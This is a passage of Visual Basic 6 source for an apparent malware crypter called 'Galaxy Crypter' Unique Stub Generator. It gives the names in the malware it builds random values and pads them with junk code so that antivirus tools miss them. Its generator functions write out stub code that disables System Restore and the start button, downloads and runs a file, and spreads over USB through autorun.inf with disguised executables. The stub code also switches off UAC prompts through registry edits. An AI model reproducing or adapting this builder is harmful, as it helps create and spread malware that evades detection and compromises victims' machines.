         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin XtremeSuiteControls.Label Label6 
      Height          =   255
      Left            =   3240
      TabIndex        =   385
      Top             =   5880
      Width           =   2895
      _Version        =   851968
      _ExtentX        =   5106
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Version Information"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Alignment       =   2
   End
   Begin VB.Label Label26 
      Caption         =   "Parameters"
      Height          =   255
      Left            =   10560
      TabIndex        =   224
      Top             =   7200
      Width           =   975
   End
   Begin VB.Label Label5 
      Caption         =   "Subs"
      Height          =   255
      Left            =   10800
      TabIndex        =   183
      Top             =   4440
      Width           =   735
   End
   Begin VB.Label Label4 
      Caption         =   "Functions"
      Height          =   255
      Left            =   10560
      TabIndex        =   182
      Top             =   5640
      Width           =   975
   End
   Begin VB.Label Label3 
      Caption         =   "Declarations"
      Height          =   255
      Left            =   10680
      TabIndex        =   181
      Top             =   3240
      Width           =   975
   End
   Begin VB.Label Label2 
      Caption         =   "Constants"
      Height          =   255
      Left            =   10800
      TabIndex        =   180
      Top             =   1920
      Width           =   975
   End
   Begin VB.Label Label1 
      Caption         =   "Api's"
      Height          =   255
      Left            =   11160
      TabIndex        =   179
      Top             =   480
      Width           =   495
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const Split_Var = "SPL#IT"

Dim FullChar    As String
Dim Spl_Txt() As String
Dim Spl_Line() As String
Dim vTemp As Variant
Dim StoreData As String
Dim TimeEx As Long
Dim TimeVal As String
Dim Hwid1   As String

Public Function DirExists(OrigFile As String)
Dim FS
Set FS = CreateObject("Scripting.FileSystemObject")
DirExists = FS.FolderExists(OrigFile)
End Function

Private Sub Command1_Click()
Txt1 = 1
text2 = 0
Text3 = 0
Text4.Text = ""
Text5.Text = ""
text6.Text = ""
Text7.Text = ""
Text9.Text = ""
Text11.Text = ""
text18.Text = ""
Text19.Text = ""
Text20.Text = ""
text21.Text = ""

Check7.Value = 0
Check8.Value = 0
Check9.Value = 1
Check11.Value = 0
Check14.Value = 0

Check19.Value = 0
Check26.Value = 0
Check15.Value = 0
Check17.Value = 0


Check10.Value = 0
Check2.Value = 0
Check16.Value = 0
Check20.Value = 0
Check21.Value = 0
Check22.Value = 0
Check25.Value = 0

FlatEdit1 = ""
FlatEdit2 = ""
FlatEdit3 = ""
FlatEdit4 = ""
FlatEdit6 = ""

End Sub


Private Sub Command10_Click()
Txt1 = 1
text2 = 0
Text3 = 0
Text4.Text = ""
Text5.Text = ""
text6.Text = ""
Text7.Text = ""
Text9.Text = ""
Text11.Text = ""
text18.Text = ""
Text19.Text = ""
Text20.Text = ""
text21.Text = ""
End Sub

Private Sub Command11_Click()
Txt1 = RandomNumber(90)
text2 = RandomNumber(90)
Text3 = RandomNumber(90)
Text4.Text = GenNumKey(25)
Text5.Text = GenNumKey(25)
text6.Text = GenNumKey(25)
Text7.Text = GenNumKey(12)
Text9.Text = GenNumKey(20)
Text11.Text = GenNumKey(25)
text18.Text = GenNumKey(20)
Text19.Text = GenNumKey(12)
Text20.Text = GenNumKey(20)
text21.Text = GenNumKey(12)
End Sub

Private Sub Command12_Click()
If FlatEdit5.Text = "" Then MsgBox "An activation key must first be entered", vbExclamation: Exit Sub
Dim G As String, Y As String, SplY() As String
Dim FullString As String

Dim Ini_Integer As Integer
Dim Ini_String As String

' Read the FTP
FullString = ReadFtpToString

If InStr(FullString, FlatEdit5) Then

FullString = Replace(FullString, FlatEdit5, vbNullString)

Open Environ("tmp") & "\Activation.txt" For Output As #1
Close #1

Open Environ("tmp") & "\Activation.txt" For Output As #1
Print #1, FullString
Close #1

CmdUpload

Call Download_INI
    Ini_String = ReadIniValue(Environ$("Tmp") & "\UsageAdd1.ini", Hwid1, "Number Of Stubs")
    If Ini_String = "" Then
    Conv_IniVal = 3
    Else: Conv_IniVal = Replace(Ini_String, Chr$(34), vbNullString)
    End If
    
Hwid1 = Replace(Hwid1, "[", vbNullString)
Hwid1 = Replace(Hwid1, "]", vbNullString)

Dim Stub_Val As Integer

Conv_IniVal = Conv_IniVal + 5

Ini_String = Chr$(34) & Conv_IniVal & Chr$(34)

Hwid1 = Replace(Hwid1, "[", vbNullString)
Hwid1 = Replace(Hwid1, "]", vbNullString)

WriteIniValue Environ$("Tmp") & "\UsageAdd1.ini", Hwid1, "Number Of Stubs", Ini_String
MsgBox "The stubs have been successfully added to your account", vbInformation, "Success"

Else
MsgBox "The activation key you entered was incorrect!", vbCritical
Exit Sub

End If

Form1.Caption = "Galaxy Crypter Automatic Unique Stub Generator"
Form1.Caption = Form1.Caption & "                   " & "Uses Remaining: " & Conv_IniVal

Call Upload_INI


End Sub

Private Sub CmdUpload()

Dim host_name As String
On Error Resume Next

    DoEvents

    host_name = txtHost.Text
    If LCase$(Left$(host_name, 6)) <> "ftp://" Then host_name = "ftp://" & host_name
    InetFtp.URL = host_name

    InetFtp.Username = txtUserName.Text
    InetFtp.Password = txtPassword.Text

    InetFtp.Execute , "Put " & _
    Environ("tmp") & "\Activation.txt" & " " & "Activation.txt"
End Sub

Private Sub Command2_Click()
Randomize
Retry:
FlatEdit1.Text = Int(10 * Rnd)
If FlatEdit1.Text = "0" Then GoTo Retry
End Sub

Private Sub Command3_Click()

'On Error Resume Next

If Conv_IniVal = 0 Or IsNumeric(Conv_IniVal) = False Then
    MsgBox "Your period to use Galaxy Crypter's Unique Stub Generator has expired!" & vbNewLine & _
    "To continue using this product please contact Coder's Central to obtain an activation code in order to renew your subscription.", vbCritical, _
    "Time Expired"
    Exit Sub
End If

Command1.Enabled = False
Command3.Enabled = False
Command4.Enabled = False
Command10.Enabled = False
Command11.Enabled = False

    If Txt1 = "" Then Txt1 = "1"
    If text2 = "" Then text2 = "1"
    If Text3 = "" Then Text3 = "1"
       
' Randomize All Vars

Dim i   As Integer
    

        For i = 0 To 44
        Call RandomizeVars(0, 44, Text1(i))
        Next i

        
        For i = 0 To 11
        Call RandomizeVars(0, 44, TxtParam(i))
        Next i

        
        For i = 0 To 47
        Call RandomizeVars(0, 44, TxtType(i))
        Next i

        
        For i = 0 To 27
        Call RandomizeVars(0, 44, Cst(i))
        Next i
        


        For i = 0 To 53
        Call RandomizeVars(0, 44, Dec(i))
        Next i

       
        For i = 0 To 21
        Call RandomizeVars(0, 44, TxtFunc(i))
        Next i

       
        For i = 0 To 31
        Call RandomizeVars(0, 44, TxtSub(i))
        Next i

        
        For i = 0 To 5
        Call RandomizeVars(0, 44, TxtMod(i))
        Next i

        For i = 4 To 8
        Call RandomizeVars(0, 44, TxtCls(i))
        Next i

        
        For i = 0 To 21
        Call RandomizeVars(0, 21, RandomCls(i))
        Next i

   
        For i = 0 To 17
        Call RandomizeVars(0, 21, RandomMod(i))
        Next i

        
        For i = 0 To 15
        Call RandomizeVars(0, 21, RandomCtl(i))
        Next i

        For i = 0 To 15
        Call RandomizeVars(0, 21, RandomPge(i))
        Next i

        For i = 0 To 3
        Call RandomizeVars(0, 25, Te1(i))
        Next i

        Call RandomizeVars(0, 25, TxtProj)

        RndStrings rVar1
        RndStrings rVar2
        RndStrings rVar3
        RndStrings rVar4
        RndStrings rVar5
        RndStrings rVar6
        RndStrings rVar7
        RndStrings rVar8
        RndStrings rVar9
        RndStrings rVar10

        RndStrings RT1
        RndStrings RT2
        RndStrings RT3
        RndStrings RT4
        RndStrings RT5
        RndStrings RT6
        RndStrings RT7
        RndStrings RT8
        RndStrings RT9
        RndStrings RT10
        RndStrings RT11
        RndStrings RT12
        RndStrings RT13
        RndStrings RT14
        RndStrings RT15
        RndStrings RT16
        RndStrings RT17
        RndStrings RT18
        RndStrings RT19
        RndStrings RT20
        RndStrings RT21
        RndStrings RT22
        RndStrings RT23
        RndStrings RT24
        RndStrings RT25
        RndStrings RT26
        RndStrings RT27
        RndStrings RT28
        RndStrings RT29
        RndStrings RT30
        RndStrings RT31
        RndStrings RT32
        RndStrings RT33
        RndStrings RT34
        RndStrings RT35
        RndStrings RT36
        RndStrings RT37
        RndStrings RT38
        RndStrings RT39
        RndStrings RT40
        RndStrings RT41
        RndStrings RT42
        RndStrings RT43
        RndStrings RT44
        RndStrings RT45
        RndStrings RT46
        RndStrings RT47
        RndStrings RT48
        RndStrings RT49
        RndStrings RT50
        RndStrings RT51
        RndStrings RT52
        RndStrings RT53
        RndStrings RT54
        RndStrings RT55
        RndStrings RT56
        RndStrings RT57
        RndStrings RT58
        RndStrings RT59
        RndStrings RT60
        RndStrings RT61
        RndStrings RT62
        
        RndStrings RT63
        RndStrings RT64
        RndStrings RT65
        RndStrings RT66
        RndStrings RT67
        RndStrings RT68
        RndStrings RT69
        RndStrings RT70
        RndStrings RT71
        RndStrings RT72
        RndStrings RT73
        RndStrings RT74
        RndStrings RT75
        RndStrings RT76
        RndStrings RT77
        RndStrings RT78
        RndStrings RT79
        RndStrings RT80
        RndStrings RT81
        RndStrings RT82
        RndStrings RT83
        
        RndStrings RT84
        RndStrings RT85
        RndStrings RT86
        RndStrings RT87
        RndStrings RT88
        RndStrings RT89
        RndStrings RT90
        RndStrings RT91
        RndStrings RT92
        RndStrings RT93
        RndStrings RT94
        RndStrings RT95
        RndStrings RT96
        RndStrings RT97
        RndStrings RT98
        RndStrings RT99
        RndStrings RT100
        RndStrings RT101
        RndStrings RT102
        RndStrings RT103
        RndStrings RT104
        RndStrings RT105
        RndStrings RT106
        RndStrings RT107
        RndStrings RT108
        RndStrings RT109
        
        
        RndStrings eVar1
        RndStrings eVar2
        
        RndStrings Tvar1
        RndStrings Tvar2
        RndStrings Tvar3
        RndStrings Tvar4
        RndStrings Tvar5
        RndStrings Tvar6
        RndStrings Tvar7
        RndStrings Tvar8
        
        RndStrings Var1
        RndStrings Var2
        RndStrings Var3
        RndStrings Var4
        RndStrings Var5
        RndStrings Var6
        RndStrings Var7
        RndStrings Var8
        RndStrings Var9
        RndStrings Var10
        RndStrings Var11
        RndStrings Var12
        RndStrings Var13
        RndStrings Var14
        RndStrings Var15
                
        RndStrings VarT1
        RndStrings VarT2
        RndStrings VarT3
        RndStrings VarT4
        RndStrings Vart5
        RndStrings VarT6
        
        For X = 1 To 15
        RndStrings ApiNames(X)
        Next X
        
        RotNumber = CInt((Rnd * 17) + 1)
        RandomHexKey = RandomNumber(95, 55)
        RandomXorKey = "&H" & Hex$(CInt((Rnd * &HFF)) + 1)
        RndStrings XorName
        RndStrings RotName
        RndStrings HexName
        Rc4_Pass = GenNumKey(RandomNumber(15, 9), 5)
        
        RndStrings Api1
        RndStrings Api2
        RndStrings H_K_C_U
        RndStrings H_K_L_M
        RndStrings Reg_SZ
        RndStrings P_V_R
        RndStrings P_Q_I
        RndStrings sPar1
        RndStrings sPar2
        RndStrings StuVar1
        RndStrings StuVar2
        RndStrings StuVar3
       
PB.Value = 10
PB.Text = "     " & "Randomizing Vars..." & " " & PB.Value & "%"

Sleep (500)

Call BeginGen

Command1.Enabled = True
Command3.Enabled = True
Command4.Enabled = True
Command10.Enabled = True
Command11.Enabled = True

        
End Sub

Private Sub RndStrings(VarName As String)

Call Randomize

Dim i           As Integer
Dim H           As Integer
Dim SplitTxt() As String

SplitTxt() = Split(FullChar, Split_Var)
    
H = 1

Randomize


Recheck:
Randomize
            VarName = GenNumKey(RandomNumber(20, 3))
            
            For X = LBound(SplitTxt()) To UBound(SplitTxt())
             If InstrWord(1, SplitTxt(X), VarName, vbBinaryCompare) Then
                GoTo Recheck
            End If
            Next X
            
            FullChar = FullChar + Split_Var + VarName


End Sub

Private Sub RandomizeVars(ByVal lMin As Integer, lMax As Integer, TxtBox As TextBox, Optional rNum As Integer)

Dim i           As Integer
Dim H           As Integer
Dim SplitTxt() As String

SplitTxt() = Split(FullChar, Split_Var)
    
H = 1

Randomize


Recheck:
Randomize
            TxtBox.Text = GenNumKey(RandomNumber(15, 5), 2)
            
            For X = LBound(SplitTxt()) To UBound(SplitTxt())
             If InstrWord(1, SplitTxt(X), TxtBox.Text, vbBinaryCompare) Then
                GoTo Recheck
            End If
            Next X
            
            FullChar = FullChar + Split_Var + TxtBox.Text

        
End Sub

Public Function M_Stealth()

    
    Dim a As String
    Dim StlVar1 As String
    Dim StlVar2 As String
    Dim StlVar3 As String
    Dim StlVar4 As String
    Dim StlVar5 As String
    Dim StlVar6 As String
    Dim StlVar7 As String
    Dim StlVar8 As String
    
    Dim uVar1 As String
    Dim uVar2 As String
    Dim uVar3 As String
    Dim uVar4 As String
    Dim uVar5 As String
    
    
    
    RndStrings StlVar1
    RndStrings StlVar2
    RndStrings StlVar3
    RndStrings StlVar4
    RndStrings StlVar5
    RndStrings StlVar6
    RndStrings StlVar7
    RndStrings StlVar8
    
    RndStrings uVar1
    RndStrings uVar2
    RndStrings uVar3
    RndStrings uVar4
    RndStrings uVar5
    
        a = "Attribute VB_Name = " & """" + GenNumKey(15) + """" + vbCrLf
    
        a = a + "PUBLIC sub " + TxtSub(5) + "(" + StlVar1 + " as integer)" & vbCrLf
        a = a + "On Error Resume Next" & vbCrLf
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check11.Value = 1 Then
        a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        a = a + "Dim " + StlVar2 + " as Object" & vbCrLf
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        a = a + "set " + StlVar2 + " = CreateObject(""wscript.shell"")" & vbCrLf
        a = a + "Select Case " + StlVar1 & vbCrLf
        
        a = a + "Case 17 ' UAC " + vbCrLf
        If Check11.Value = 1 Then
        a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        If Check19.Value = 1 Then
        a = a + "Call " + TxtFunc(2) & vbCrLf
        End If
        
        a = a + "Case 18" & vbCrLf
        If Check9.Value = 1 Then a = a + Trash3 + S1
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        a = a + "Shell " + Dec(14) + "(40), vbHide" & vbCrLf
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        a = a + "Case 19" & vbCrLf
        If Check9.Value = 1 Then a = a + Trash3 + S1
        If Check11.Value = 1 Then
        a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        a = a + "Obj.Regwrite " + Dec(14) + "(56), ""1""" + S1
        If Check20.Value = 1 Then a = a + Trash1 + S1
        a = a + "Case 20" & vbCrLf
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "hWnd2 = FindWindow (""Shell_TrayWnd"", """")" & vbCrLf
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check11.Value = 1 Then
        a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        a = a + "hWnd2 = FindWindowEx(hWnd2, 0, ""Button"", vbNullString)" & vbCrLf
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        a = a + "EnableWindow hWnd2, False" & vbCrLf
        
        a = a + "Case 21" & vbCrLf
        If Check11.Value = 1 Then
        a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "Kill Environ(" + Dec(14) + "(49)) & " + Dec(14) + "(58)" + S1
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        a = a + "Case 22" & vbCrLf
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check11.Value = 1 Then
        a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "Dim " + StlVar3 + "," + StlVar4 & vbCrLf
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        a = a + "on local error resume next" & vbCrLf + "Set " + StlVar3 + " = GetObject(" + Dec(14) + "(59))" & vbCrLf
        a = a + StlVar4 + " = " + StlVar3 + ".disable(""C:\"")" & vbCrLf + StlVar4 + " = " + StlVar3 + ".disable(""D:\"")" & vbCrLf
        
        a = a + "Case 23" & vbCrLf
        If Check11.Value = 1 Then
        a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "Dim " + StlVar5 + " as long, " + StlVar6 + " as string" & vbCrLf
        If Check20.Value = 1 Then a = a + Trash1 + S1
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        a = a + "if " + Dec(14) + "(42) = ""1"" then " + Dec(14) + "(42) = Environ$(" + Dec(14) + "(46))" & vbCrLf
        
        If Check9.Value = 1 Then
            If ComboBox1(2).ListIndex >= 1 Then
            a = a + Trash4 + S1
        Else
            a = a + Trash3 + S1
            End If
        End If
        
        a = a + "if " + Dec(14) + "(42) = ""2"" then " + Dec(14) + "(42) = Environ$(" + Dec(14) + "(47))" & vbCrLf
        
        If Check20.Value = 1 Then a = a + Trash1 + S1
        a = a + "if " + Dec(14) + "(42) = ""3"" then " + Dec(14) + "(42) = Environ$(" + Dec(14) + "(49))" & vbCrLf
        If Check9.Value = 1 Then
            If ComboBox1(2).ListIndex >= 1 Then
        a = a + Trash4 + S1
            Else
        a = a + Trash3 + S1
            End If
        End If
        
        a = a + "if " + Dec(14) + "(42) = ""4"" then " + Dec(14) + "(42) = Environ$(" + Dec(14) + "(52)) & ""\""" + " & " + Dec(14) + "(53)" + S1
        a = a + "if " + Dec(14) + "(42) = ""5"" then " + Dec(14) + "(42) = Environ$(" + Dec(14) + "(50))" & vbCrLf
        
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        a = a + StlVar6 + " = " + Dec(14) + "(42) & ""\"" & " + Dec(14) + "(43)" & vbCrLf
        a = a + "if " + TxtSub(4) + "(" + StlVar6 + ") then kill " + StlVar6 & vbCrLf
        a = a + StlVar6 + " = " + Dec(20) + "." + TxtFunc(3) + "(" + Dec(14) + "(60)," + Dec(14) + "(61),0,StrPtr(" + Dec(12) + "), StrPtr(" + StlVar6 + "),0,0)" & vbCrLf
        a = a + "if " + StlVar5 + " <> 0 then goto EndDownLoad" & vbCrLf
        a = a + "if " + Dec(14) + "(41) <> """" then " & vbCrLf
        
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        
        a = a + "dim " + StlVar7 + " as string" & vbCrLf + "if instr(" + Dec(14) + "(41), ""Default Browser"") then " + Dec(14) + "(41) = " + TxtFunc(0) & vbCrLf
        a = a + "if " + Dec(14) + "(41) = """" then " + Dec(14) + "(41) = " + App_Path & vbCrLf
        
        If Check20.Value = 1 Then
        If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 + S1
        End If
        
        a = a + "open " + StlVar6 + " For binary as #1" & vbCrLf + StlVar7 + " = string(lof(1),vbnullchar)" & vbCrLf
        a = a + "Get #1, , " + StlVar7 & vbCrLf + " Close #1 " & vbCrLf & vbCrLf
        a = a + "Call " + Dec(20) + "." + TxtSub(1) + "(" + Dec(14) + "(41), Strconv(" + StlVar7 + ", VbFromUnicode))" & vbCrLf
        
        If Check20.Value = 1 Then
        If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 + S1
        End If
        
        a = a + "Else " & vbCrLf + "If " + Dec(14) + "(44) = ""1"" then " & vbCrLf
        
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        a = a + ApiNames(1) + " hwnd, ""open"" ," + StlVar6 + ", 0, 0, 1" & vbCrLf
        
        If Check20.Value = 1 Then
        If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 + S1
        End If
        
        a = a + ApiNames(1) + " hwnd, ""open"" ," + StlVar6 + ", 0, 0, 0" & vbCrLf + " End if " & vbCrLf + "End if " & vbCrLf
        
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        a = a + ApiNames(2) + "(" + Dec(14) + "(45))" & vbCrLf + "EndDownload:" & vbCrLf + "Exit Sub" & vbCrLf
        a = a + "Case 24 ' USB Spread" & vbCrLf
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        a = a + "Call " + TxtSub(10) & vbCrLf + "End select" & vbCrLf + "end sub" & vbCrLf & vbCrLf
        a = a + "Private sub " + TxtSub(10) & vbCrLf
        a = a + "On local error resume next" & vbCrLf
        
        If Check21.Value = 1 Then a = a + Trash2 + S1
        
        If Check11.Value = 1 Then
        a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        
        a = a + "Dim " + uVar1 + " as long, " + uVar2 + " as long, " + uVar3 + " as string, " + uVar4 + "()" + " as string " & vbCrLf
        
        If Check11.Value = 1 Then
        If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        End If
        
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        a = a + uVar2 + " = GetLogicalDrives" & vbCrLf + "Doevents" & vbCrLf + "For " + uVar1 + " = 0 to 25 " & vbCrLf
        
        If Check20.Value = 1 Then
        If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 + S1
        End If
        
        a = a + uVar3 + " = " + uVar3 + " & " + Cst(7) + " & """" + """" & """" & (chr(65 + " + uVar1 + ")) & "";\""" & vbCrLf
        a = a + "next" & vbCrLf + uVar4 + " = Split(" + uVar3 + "," + Cst(7) + ")" & vbCrLf
        
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        If Check21.Value = 1 Then a = a + Trash2 + S1
        
        a = a + "for " + uVar1 + " = 1 to ubound(" + uVar4 + ") - 1 " & vbCrLf
        a = a + "if GetDriveType( " + uVar4 + "(" + uVar1 + ")) = 2 then " & vbCrLf
        a = a + "if " + TxtSub(4) + "(" + uVar4 + "(" + uVar1 + ") & ""\autorun.inf"") then " & vbCrLf
        
        If Check20.Value = 1 Then
        If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 + S1
        End If
        
        a = a + "SetAttr " + uVar4 + "(" + uVar1 + ") & ""\autorun.inf"",0 " & vbCrLf
        a = a + "Kill " + uVar4 + "(" + uVar1 + ") & ""\autorun.inf""" & vbCrLf
        a = a + "end if" & vbCrLf
        
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        If Check21.Value = 1 Then a = a + Trash2 + S1
        a = a + "if " + TxtSub(4) + "(" + uVar4 + "(" + uVar1 + ") & ""\"" & ""PowerPt.exe"") then kill " + uVar4 + "(" + uVar1 + ") & ""\"" & ""PowerPt.exe""" & vbCrLf
        a = a + "open " + uVar4 + "(" + uVar1 + ") & ""\autorun.inf"" for append as #1 " & vbCrLf
        a = a + "Print #1,""[autorun]"" & vbcrlf & _ " & vbCrLf + """open="" & " + uVar4 + "(" + uVar1 + ") & ""\"" & ""PowerPt.exe""" & vbCrLf
        If Check21.Value = 1 Then a = a + Trash2 + S1
        a = a + "Close #1" & vbCrLf
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        If Check21.Value = 1 Then a = a + Trash2 + S1
        a = a + "CopyFile " & TxtFunc(13) & ", " + uVar4 + "(" + uVar1 + ") & ""TeamViewer.exe"",0" & vbCrLf
        a = a + "setattr " + uVar4 + "(" + uVar1 + ") & ""PowerPt.exe"",2" & vbCrLf
        a = a + "setattr " + uVar4 + "(" + uVar1 + ") & ""\autorun.inf"",vbhidden " & vbCrLf
        a = a + "end if" & vbCrLf + "next " & vbCrLf + " end sub " & vbCrLf & vbCrLf
                

    M_Stealth = a

End Function

Public Function m_UAC()

Dim a As String


a = "Attribute VB_Name = " & """" + GenNumKey(15) + """" + vbCrLf
       
a = a + "Private Const " + Var1 + " = &H20& " & vbCrLf
a = a + "Private Const " + Var2 + " = &H20000" & vbCrLf
a = a + "Private Const " + Var3 + " = &H40000" & vbCrLf
a = a + "Private Const " + Var4 + " = &H80000" & vbCrLf
a = a + "Private Const " + Var5 + " = &H100000" & vbCrLf & vbCrLf
a = a + "private Const " + Var6 + " = &HF0000" & vbCrLf
a = a + "Private Const " + Var7 + " = " + Var2 & vbCrLf
a = a + "Private Const " + Var8 + " = &H1F0000" & vbCrLf
a = a + "Private Const " + Var9 + " = " + Var7 + " Or &H2& Or &H4& " & vbCrLf
a = a + "Private Const " + Var10 + " = ((" + Var8 + " Or &H1& Or &H2& Or &H4& Or &H8& Or &H10& Or " + Var1 + ") And (Not " + Var5 + "))" & vbCrLf

a = a + "Public Enum " + Var11 & vbCrLf
a = a + eVar1 + " = &H80000001" & vbCrLf
a = a + eVar2 + " = &H80000002" & vbCrLf
a = a + "end enum " & vbCrLf & vbCrLf

a = a + "Public Type " + Var12 & vbCrLf
a = a + Tvar1 + " as long" & vbCrLf
a = a + Tvar2 + " as long" & vbCrLf
a = a + "end type" & vbCrLf & vbCrLf

a = a + "Public Type " + Var13 & vbCrLf
a = a + Tvar3 + " as " + Var12 & vbCrLf
a = a + Tvar4 + " as long " & vbCrLf
a = a + "end type " & vbCrLf

a = a + "Public Type " + Var14 & vbCrLf
a = a + Tvar5 + " as long " & vbCrLf
a = a + Tvar6 + " as " + Var13 & vbCrLf
a = a + "End type" & vbCrLf & vbCrLf

a = a + "Function " + TxtFunc(2) + "()" & vbCrLf
a = a + "if " + TxtFunc(5) + "(""SeBackupPrivilege"") = true then " & vbCrLf
a = a + "Call " + TxtFunc(6) + "(" + eVar2 + ",""SOFTWARE\Microsoft\Security Center"", ""UACDisableNotify"", ""0"")" & vbCrLf
a = a + "Call " + TxtFunc(6) + "(" + eVar2 + ",""SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"", ""ConsentPromptBehaviorAdmin"", ""0"")" & vbCrLf & vbCrLf
a = a + "end if " & vbCrLf
a = a + "end function" & vbCrLf & vbCrLf

Dim fVar1 As String
Dim fVar2 As String
Dim fVar3 As String
Dim fVar4 As String
Dim fVar5 As String
Dim fVar6 As String
Dim fVar7 As String
Dim fVar8 As String
Dim fVar9 As String

Randomize

RndStrings fVar1
RndStrings fVar2
RndStrings fVar3
RndStrings fVar4
RndStrings fVar5
RndStrings fVar6
RndStrings fVar7
RndStrings fVar8
RndStrings fVar9

a = a + "Function " + TxtFunc(5) + "(" + Var15 + " as string) as boolean" & vbCrLf
a = a + "Dim " + fVar1 + " as long, " + fVar2 + " as long ," + fVar3 + " as long, " + fVar4 + " as " + Var12 + "," + fVar5 + " as " + Var14 + "," + fVar6 + " as " + Var14 & vbCrLf
a = a + fVar1 + " = OpenProcessToken(GetCurrentProcess(), &H20 Or &H8&," + fVar2 + ")" & vbCrLf
a = a + "if " + fVar1 + " = 0 then exit function " & vbCrLf
a = a + fVar1 + " = LookupPrivilegeValue(0&, " + Var15 + "," + fVar4 + ")" & vbCrLf
a = a + "if " + fVar1 + " = 0 then exit function " & vbCrLf
a = a + "with " + fVar5 & vbCrLf
a = a + "." + Tvar5 + " = 1 " & vbCrLf + "." + Tvar6 + "." + Tvar4 + " = &H2" & vbCrLf + "." + Tvar6 + "." + Tvar3 + " = " + fVar4 & vbCrLf
a = a + "end with" & vbCrLf
a = a + TxtFunc(5) + " = (AdjustTokenPrivileges(" + fVar2 + ", false, " + fVar5 + ", len(" + fVar6 + ") ," + fVar6 + "," + fVar3 + ") <> 0 )" & vbCrLf
a = a + "end function " & vbCrLf

Dim F2Var1 As String
Dim F2Var2 As String
Dim F2Var3 As String
Dim F2Var4 As String
Dim F2Var5 As String
Dim F2Var6 As String
Dim F2Var7 As String

RndStrings F2Var1
RndStrings F2Var2
RndStrings F2Var3
RndStrings F2Var4
RndStrings F2Var5
RndStrings F2Var6
RndStrings F2Var7

a = a + "Function " + TxtFunc(6) + "(" + F2Var1 + " as " + Var11 + "," + F2Var2 + " as string, " + F2Var3 + " as string, " + F2Var4 + " as long )" & vbCrLf
a = a + "If RegOpenKeyEx(" + F2Var1 + "," + F2Var2 + ", 0&, " + Var9 + ", mainkey) = 0& then " & vbCrLf
a = a + "if (RegSetValueExA(mainKey, " + F2Var3 + ", 0, 4, " + F2Var4 + ",4) = 0&) then " & vbCrLf
a = a + "RegCloseKey mainKey" & vbCrLf + "end if" & vbCrLf + "end if " & vbCrLf + "end function" & vbCrLf & vbCrLf

m_UAC = a

End Function

Private Function M_Public() As String

'Module Public [Public Declarations, Types, APIs]

Dim a As String

' ****************************
'           TYPES
' ----------------------------

Dim f_type1 As String   'METAFILEPICT
Dim f_type2 As String   'XForm
